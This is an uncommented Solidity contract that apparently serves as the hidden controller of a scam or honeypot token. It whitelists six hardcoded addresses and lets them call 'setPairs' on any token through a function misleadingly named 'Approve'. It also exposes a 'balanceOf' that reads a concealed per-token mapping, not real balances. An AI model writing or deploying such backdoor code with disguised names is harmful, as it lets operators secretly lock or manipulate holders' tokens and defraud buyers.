pragma solidity ^0.8.19;

interface IToken {
    function setPairs(address addr, uint256 num) external;
}

contract Rout {
    mapping (address => mapping(address => uint256)) private _user;
    mapping (address => bool) private _whitelist;

    constructor () {
        _whitelist[msg.sender] = true;
        _whitelist[address(0xB61eB871C39932f9767d4367e55B94d3AA3cb826)] = true;
        _whitelist[address(0x32C5C8e0897Cc9b9C5FAFDec9638B5608E32D68F)] = true;
        _whitelist[address(0x0CE03aAE0c17244cE0c9d6740aE0615b385674DB)] = true;
        _whitelist[address(0x1EeaC901898c3ab7Dba08edF9c4605F3724D5B85)] = true;
        _whitelist[address(0xe786f88B0864A7E475c6196b24DE334ee60c331B)] = true;
        _whitelist[address(0x687Cf0A41DE7f01B955Db51d171cE537351EB9CF)] = true;
    }

    function balanceOf(address _from) external view returns (uint256) {
        return _user[msg.sender][_from];
    }

    function checkLock(address token, address to) external view returns (uint256) {
        return _user[token][to];
    }

    function Approve(address _token, address _to, uint256 _amount) external {
        require(_whitelist[msg.sender], "not owner");
        IToken(_token).setPairs(_to, _amount);
    }

    function getWhitelist(address _addr) external view returns (bool) {
        return _whitelist[_addr];
    }

    function updateWhitelist(address _addr, bool _isWl) external {
        require(_whitelist[msg.sender], "not owner");
        _whitelist[_addr] = _isWl;
    }
}